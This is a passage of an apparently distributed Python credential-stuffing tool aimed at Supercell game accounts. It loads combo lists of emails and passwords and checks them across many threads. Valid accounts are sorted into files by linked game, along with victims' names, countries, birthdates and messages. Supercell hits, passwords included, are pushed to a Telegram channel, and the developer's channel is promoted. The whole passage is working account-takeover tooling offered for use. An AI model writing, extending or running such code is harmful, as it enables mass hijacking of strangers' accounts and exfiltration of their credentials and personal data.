            with open(game_file, "a", encoding="utf-8") as f:
                f.write(f"{result['email']}:{result['password']}\n")
        
        if result['brawl_stars'] == "✔️":
            game_file = os.path.join(results_dir, "Brawl_Stars.txt")
            with open(game_file, "a", encoding="utf-8") as f:
                f.write(f"{result['email']}:{result['password']}\n")
        
        if result['clash_of_clans'] == "✔️":
            game_file = os.path.join(results_dir, "Clash_of_Clans.txt")
            with open(game_file, "a", encoding="utf-8") as f:
                f.write(f"{result['email']}:{result['password']}\n")
        
        if result['hay_day'] == "✔️":
            game_file = os.path.join(results_dir, "Hay_Day.txt")
            with open(game_file, "a", encoding="utf-8") as f:
                f.write(f"{result['email']}:{result['password']}\n")
        
        # Save detailed info
        all_supercell_file = os.path.join(results_dir, "All_Supercell_Detailed.txt")
        with open(all_supercell_file, "a", encoding="utf-8") as f:
            f.write(output_line + "\n" + "-" * 80 + "\n")
    
    def save_general_hit(self, result):
        """Save general hits (valid accounts without Supercell)"""
        output_line = f"{result['email']}:{result['password']}"
        
        # Save to General_Hits.txt
        general_file = os.path.join(results_dir, "General_Hits.txt")
        with open(general_file, "a", encoding="utf-8") as f:
            f.write(output_line + "\n")
        
        # Save detailed info
        detailed_line = (f"{result['email']}:{result['password']} | "
                        f"Country = {result['country']} | "
                        f"Name = {result['name']} | "
                        f"Birthdate = {result['birthdate']} | "
                        f"Total Messages = {result['total_messages']} | "
                        f"Supercell = NO | "
                        f"Last Message = {result['last_message']}")
        
        detailed_file = os.path.join(results_dir, "General_Detailed.txt")
        with open(detailed_file, "a", encoding="utf-8") as f:
            f.write(detailed_line + "\n")
    
    def send_telegram_notification(self, result, is_supercell=False):
        """Send result to Telegram (ONLY for Supercell accounts)"""
        if not self.telegram.enabled or not is_supercell:
            return
        
        # Format game status
        games_status = ""
        games_list = []
        
        if result['clash_royale'] == "✔️":
            games_status += "• Clash Royale: ✅\n"
            games_list.append("ClashRoyale")
        if result['brawl_stars'] == "✔️":
            games_status += "• Brawl Stars: ✅\n"
            games_list.append("BrawlStars")
        if result['clash_of_clans'] == "✔️":
            games_status += "• Clash of Clans: ✅\n"
            games_list.append("ClashOfClans")
        if result['hay_day'] == "✔️":
            games_status += "• Hay Day: ✅\n"
            games_list.append("HayDay")
        
        if not games_status:
            games_status = "• No games detected\n"
        
        # Create hashtags
        hashtags = f"#Supercell {' '.join(['#' + game for game in games_list])}"
        country_tag = f"#{result['country'].replace(' ', '')}" if result['country'] != "Unknown" else ""
        
        message = f"""
<b>🎮 SUPERCELL HIT FOUND! - {MY_SIGNATURE}</b>
<b>🔗 {TELEGRAM_CHANNEL}</b>

<b>📧 Email:</b> <code>{result['email']}</code>
<b>🔑 Password:</b> <code>{result['password']}</code>
<b>👤 Name:</b> {result['name']}
<b>🌍 Country:</b> {result['country']}
<b>🎂 Birthdate:</b> {result['birthdate']}

<b>📊 LINKED GAMES:</b>
{games_status}
<b>📨 TOTAL MESSAGES:</b> {result['total_messages']}
<b>📅 LAST MESSAGE:</b> {result['last_message']}

{hashtags} {country_tag}
        """
        
        self.telegram.send(message)

def worker(account_queue, processor, total_accounts):
    """Worker thread function"""
    while True:
        try:
            account_num, email, password = account_queue.get_nowait()
        except queue.Empty:
            break
        
        try:
            processor.process_account(email, password, account_num, total_accounts)
        except Exception as e:
            with print_lock:
                print(f"{Fore.RED}[!] Critical error in worker: {str(e)}")
        finally:
            account_queue.task_done()

def main():
    """Main function"""
    # Inputs
    print(f"\n{Fore.CYAN}⚙️  CONFIGURATION SETUP")
    print(f"{Fore.WHITE}──────────────────────────────────────────────────────────────")
    
    tok = input(f'{Fore.YELLOW}[+] Enter Telegram Token (or press Enter to skip): ').strip()
    chat_id = input(f'{Fore.YELLOW}[+] Enter Telegram Chat ID (or press Enter to skip): ').strip()
    
    # File input
    combo_file = input(f'{Fore.YELLOW}[+] Enter Combo Filename (default: combo.txt): ').strip()
    if not combo_file:
        combo_file = "combo.txt"
    
    # Thread count
    try:
        thread_count = int(input(f'{Fore.YELLOW}[+] Enter Thread Count (default: 75): ').strip() or "75")
    except:
        thread_count = 75
    
    # Check if file exists
    if not os.path.exists(combo_file):
        # Try to find in current directory
        possible_paths = [
            combo_file,
            os.path.join(os.getcwd(), combo_file),
            os.path.join(os.path.dirname(__file__), combo_file)
        ]
        
        found = False
        for path in possible_paths:
            if os.path.exists(path):
                combo_file = path
                found = True
                break
        
        if not found:
            print(f"{Fore.RED}❌ ERROR: File '{combo_file}' not found!")
            input("Press Enter to exit...")
            return
    
    # Read accounts
    try:
        with open(combo_file, "r", encoding="utf-8") as f:
            accounts = []
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if ':' in line:
                    email, password = line.split(':', 1)
                    accounts.append((line_num, email.strip(), password.strip()))
    except Exception as e:
        print(f"{Fore.RED}❌ ERROR reading file: {str(e)}")
        input("Press Enter to exit...")
        return
    
    stats.total = len(accounts)
    
    print(f"\n{Fore.CYAN}📊 LOADED {stats.total} ACCOUNTS FROM: {combo_file}")
    print(f"{Fore.CYAN}🧵 USING {thread_count} THREADS")
    print(f"{Fore.CYAN}📱 TELEGRAM: {'ENABLED' if tok and chat_id else 'DISABLED'}")
    print(f"{Fore.WHITE}──────────────────────────────────────────────────────────────")
    
    input(f"{Fore.GREEN}[+] Press Enter to start checking...")
    
    # Initialize telegram notifier
    telegram = TelegramNotifier(tok, chat_id)
    processor = AccountProcessor(telegram)
    
    # Create queue
    account_queue = queue.Queue()
    for account in accounts:
        account_queue.put(account)
    
    # Start timer
    start_time = datetime.datetime.now()
    
    # Start workers
    print(f"\n{Fore.CYAN}🚀 STARTING CHECKING PROCESS...")
    print(f"{Fore.WHITE}──────────────────────────────────────────────────────────────\n")
    
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = []
        for _ in range(thread_count):
            future = executor.submit(worker, account_queue, processor, stats.total)
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"{Fore.RED}[!] Worker error: {str(e)}")
    
    # Calculate statistics
    end_time = datetime.datetime.now()
    duration = end_time - start_time
    hours, remainder = divmod(duration.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    stats_data = stats.get_stats()
    
    # Display final statistics
    print(f"\n{Fore.CYAN}══════════════════════════════════════════════════════════════")
    print(f"{Fore.CYAN}                    CHECKING COMPLETED!                       ")
    print(f"{Fore.CYAN}══════════════════════════════════════════════════════════════")
    print(f"{Fore.GREEN}✅ TOTAL HITS (Valid Accounts): {stats_data['hits']}")
    print(f"{Fore.CYAN}🎮 SUPERCELL HITS (With Games): {stats_data['supercell_hits']}")
    print(f"{Fore.RED}❌ BAD ACCOUNTS: {stats_data['bad']}")
    print(f"{Fore.YELLOW}⚠️ ERRORS: {stats_data['errors']}")
    print(f"{Fore.CYAN}📊 CHECKED: {stats_data['checked']}/{stats_data['total']}")
    print(f"{Fore.CYAN}⏱ TIME: {hours:02d}:{minutes:02d}:{seconds:02d}")
    
    if stats_data['checked'] > 0 and duration.seconds > 0:
        speed = stats_data['checked'] / duration.seconds
        print(f"{Fore.CYAN}🚀 SPEED: {speed:.2f} accounts/second")
    
    print(f"{Fore.CYAN}══════════════════════════════════════════════════════════════")
    print(f"{Fore.YELLOW}📁 Results saved in: {results_dir}/")
    print(f"   • Supercell_Hits.txt - ONLY accounts with Supercell games")
    print(f"   • General_Hits.txt - All valid accounts")
    print(f"   • Clash_Royale.txt, Brawl_Stars.txt, etc. - Individual game files")
    print(f"{Fore.CYAN}══════════════════════════════════════════════════════════════\n")
    
    # Send final stats to Telegram
    if telegram.enabled:
        stats_message = f"""
<b>📊 SUPERCELL CHECKER - FINAL STATS</b>
<b>🔗 {TELEGRAM_CHANNEL}</b>

<b>📈 Total Accounts:</b> {stats_data['total']}
<b>✅ Valid Accounts:</b> {stats_data['hits']}
<b>🎮 Supercell Accounts:</b> {stats_data['supercell_hits']}
<b>❌ Bad Accounts:</b> {stats_data['bad']}
<b>⚠️ Errors:</b> {stats_data['errors']}
<b>⏱ Duration:</b> {hours:02d}:{minutes:02d}:{seconds:02d}

<b>🔗 Developer:</b> {MY_SIGNATURE}
        """
        telegram.send(stats_message)
    
    input(f"{Fore.GREEN}[+] Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Process interrupted by user.")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Unexpected error: {str(e)}")
        import traceback
        traceback.print_exc()
    finally:
        print(f"\n{Fore.CYAN}[*] Tool developed by {MY_SIGNATURE} - {TELEGRAM_CHANNEL}")